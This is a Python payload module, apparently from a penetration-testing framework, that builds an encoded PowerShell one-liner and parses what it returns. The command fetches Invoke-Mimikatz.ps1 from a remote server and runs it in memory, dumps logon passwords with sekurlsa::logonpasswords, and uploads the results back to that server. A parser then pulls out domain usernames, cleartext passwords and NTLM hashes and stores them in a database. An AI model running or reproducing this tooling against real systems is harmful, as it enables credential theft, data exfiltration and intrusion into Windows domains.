import sys
import os
import re
sys.path.append(os.path.join(os.path.dirname(__file__), '..', '..'))
from utils.db import DB
from utils.output import Output
from server.ressources import get_ressource_md5, powershell_encode_base64

class Payload:
    name = 'Mimikatz'
    args = ['Server_IP:Server_port']
    filename = 'mimikatz.txt'

    def generate_payload(self, url):
        # Mimikatz in memory in memory

        if not url.startswith('http://'):
            url = 'http://' + url

        # Stage1: load Invoke-Mimikatz.ps1
        pwsh_md5 = get_ressource_md5("Invoke-Mimikatz.ps1")
        stage1 = 'IEX(New-Object Net.WebClient).DownloadString("%s/ressources/%s")' % (url, pwsh_md5)

        # Stage2: execute mimikatz
        stage2 = '$Out = Invoke-Mimikatz -Command "privilege::debug sekurlsa::logonpasswords exit"'

        # Stage4: post result
        stage3 = '(New-Object Net.WebClient).UploadString("%s/ressources/%s", $Out)' % (url, self.filename)

        payload = ';'.join([stage1, stage2, stage3])

        return "powershell.exe -e %s" % powershell_encode_base64(payload)

    def process_output(self, file_path):
        user = {}

        f = open(file_path)
        for line in f:
            line = line.strip()

            m = re.match('^\s*\*\s+(Username|Domain|NTLM|Password)\s+:\s+(.+)\s*$', line)
            if m:
                key = m.group(1)
                value = m.group(2)

                if key == 'Username':
                    user['username'] = value
                elif key == 'Domain':
                    user['domain'] = value
                elif key == 'Password':
                    user['password'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['password'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user password: {domain}\\{username}:{password}'.format(**user))
                            DB.insert_domain_user(user)

                    user = {}
                elif key == 'NTLM':
                    user['hash'] = value

                    if user['username'] != '(null)' and user['domain'] != '(null)' and user['hash'] != '(null)':
                        if not user['username'].endswith('$'):
                            Output.major('New user hash: {domain}\\{username}:{hash}'.format(**user))
                            DB.insert_domain_user(user)

                    user = {}
        f.close()
